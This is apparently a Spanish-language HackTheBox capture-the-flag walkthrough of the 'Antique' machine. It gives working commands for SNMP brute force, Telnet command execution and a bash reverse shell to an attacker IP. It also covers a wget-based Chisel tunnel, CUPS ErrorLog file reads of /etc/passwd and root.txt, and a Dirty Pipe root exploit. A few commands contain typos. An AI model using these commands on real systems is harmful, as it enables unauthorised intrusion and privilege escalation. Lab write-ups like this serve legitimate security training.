## Summary

Tags: #UDP #Chisel #PortForwarding #GCC #Telnet #Linux #UDP #SNMP #Chisel #CUPS #Nmap 

- IP -> 10.10.11.107
- Ports -> TCP (23), UDP (161)
- OS ->  Linux
- Services & Applications
    - 23 -> Telnet
    - 161 -> SNMP 


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon

```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts
```

```bash
❯ nmap -sCV -p23 ❮Target IP❯ -oN targeted
```
Solo encontramos el puerto 23 OPEN, por lo que decidimos escanear por UDP

```bash
❯ nmap -sU --top-ports 100 --open -T5 -v -n ❮Target IP❯     # Escaneo de puertos por UDP
```
Descubrimos el puerto 161 SNMP 

Ahora nos ponemos a explorar en ese puerto.
```bash
/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt     # Diccionario del snmp a usar para Fuerza Bruta
```

```bash
❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt ❮IP❯     # Sirve para hacer Fuerza Bruta al snmp y encontrar los 'community strings'
```

```bash
❯ snmwalk -c public -v2c ❮IP❯                                                     # Sirve para poder inspeccionar el puerto SNMP

	# c = Community string, 'Public' es el mas comun
	# v2c = version

❯ snmwalk -c public -v2c ❮IP❯ 1                                                   # Colocar 1 significa que empezara desde la raiz '/' y asi poder enco0ntrar mas informacion acerca del protocolo, por default empieza desde el 2
```

* El primer comando en esta ocasion nos regresa un "HTB-PRINTER"
* El segundo nos devuelve mas informacion y ahi encontramos BITS en Hexadecimal 

```bash 
❯ echo '50 40 73 73 77 30 72 64 40 ...' | xargs | xxd -ps -r               # Nos convierte la cadena de Hex a 

	# xargs = Nos pone la cadena en una sola linea
	# xxd = Nos invierte el proceso del Hex
```
Nos regresa lo siguiente: **P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i** que es una passwd

## User

Ahora nos regresamos a Telnet y probamos con esa passwd

```bash 
❯ telnet <IP> 23                             # Iniciar sesion en Telnet en su puerto por default 23

	❯ ?                                     # Miramos el panel de ayuda, en ocasiones encontramos ‘exec system commands’ 
     ❯ exec id                               # Nos muestra el id en el que estamos
     ❯ exec ifconfig                         # Nos muestra las interfaces y su ip address
     ❯ exec bash -c “bash -i >& /dev/tcp/10.10.14.2/443 0>&1”     # Si podemos ejecutar comandos, podemos hacer una ReverShell de esta manera, IP del atacante y su puerto
```

```bash
❯ nc -nlvp 443                   # Nos ponemos en escucha para recibir la ReverShell
```
Ahora estamos adentro de la maquina 

* Le hacemos el tratamiento a la pseudoconsola
```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

Ahora podemos buscar la flag user.txt

```bash
❯ sudo -l                                                # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```

```bash 
❯ find / -perm -4000 -ls 2>/dev/null               # Buscaremos por privilegios SUID, con ls = Miramos los privilegios y buscamos los de root
```

```bash
❯ which getcap                             # Para ver si esta instalado el Getcap y mirar las capabilities

❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins](https://gtfobins.github.io/)
```
Pero tampoco encontramos algo 

```bash
❯ netstat -nat                                    # Podemos ver los puertos abiertos internos 
```
Encopntramos el puerto 631

```bash
❯ curl http://127.0.0.1:631                       # Para ver si hay contenido en ese puerto 
```
Nos muestra contenido de una pagina web llamada '**CUPS 1.6.1'

Nos traeremos ese puerto a nuestra maquina de atacante con Chisel
* [Chisel](https://github.com/jpillora/chisel)
```bash
❯ git clone https://github.com/jpillora/chisel       # Nos descargamos el Chisel
```

Dentro de Chisel 
```bash
❯ go build -ldflags “-s -w” .                        # Nos ayudara a reducir el tamaño del compilado 
❯ upx Chisel                                         # Para reducir aun mas el tamaño
```

```bash
❯ python3 -m http.server 80                          # Nos montamos un servidor http 80 para poder pasar el Chisel a la maquina victima 
```

En la maquina victima nos dirigimos al dir **/tmp** ya que el contiene permisos de lectura y escritura. Ahi ejecutamos el siguiente comando
```bash
❯ wget http://10.10.14.4/chisel                      # Para poder cargar o descargar un archivo especifico desde una IP de atacante
❯ chmod +x chisel                                    # Le damos permisos de ejecucion a Chisel
```

```bash
❯ ./chisel server --reverse -p 1234          # Server 'Maquina de atacante'
❯ ./chisel client 10.10.14.4:1234 R:631:127.0.0.1:631 # Cliente 'Maquina victima'
```
Ahora podemos ingresar de forma local a nuestro **Localhost:631**, en donde podemos irar una web. 

```bash
❯ searchsploit cups                # Para buscar un exploit
```

Buscamos en Google
* [CUPS-Explot](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb)
Si filtramos por **exec**, podemos ver que es lo que ejecuta el exploit. Ecnontramos que podemos controlar el log de error

Ahora en la maquina victima hacemos lo siguiente:
```bash
❯ which cupsctl                                               # Para ver si existe ese binario
```

```bash
❯ cupsctl ErrorLog=/etc/passwd                                # Utilizando el binario, generaremos el error
❯ curl -s -X GET http://localhost:631/admin/log/error_log     # Miramos el log y nos muestra la ruta anterior
```

## Root

```bash
❯ cupsctl ErrorLog=/root/root.txt
❯ curl -s -X GET http://localhost:631/admin/log/error_log     # Miramos el log y nos muestra la ruta anterior y podremos ver la flag de root
```


---
#### Segunda forma de explotacion 

* [Dirty-Pipe-Arinerron](https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit)

```bash
❯ which gcc                                       

	# /usr/bin/gcc = El Dirty-Pipe nos ayudara a sobre-escribir el ''/etc/passwd' 
	# En la pagina de Arinerron nos vamos a 'exploit.c' despues le damos a RAW y copiamos el contenido en un archivo llamado 'priv.c' en la maquina victima en el dir '/tmp'

❯ gcc privesc.c -o privesc                       # Asi lo compilamos en la maquina victima
❯ ./privesc.c                                    # Ejecutamos el binario y nos convierte en root, ya que coloca a 'aaron' como usuario root y su passwd 'aaron'
❯ su root                                        # Cambiar a usuario root con el nombre aaron seteado
```

Ahora vamos por la flag de **root.txt**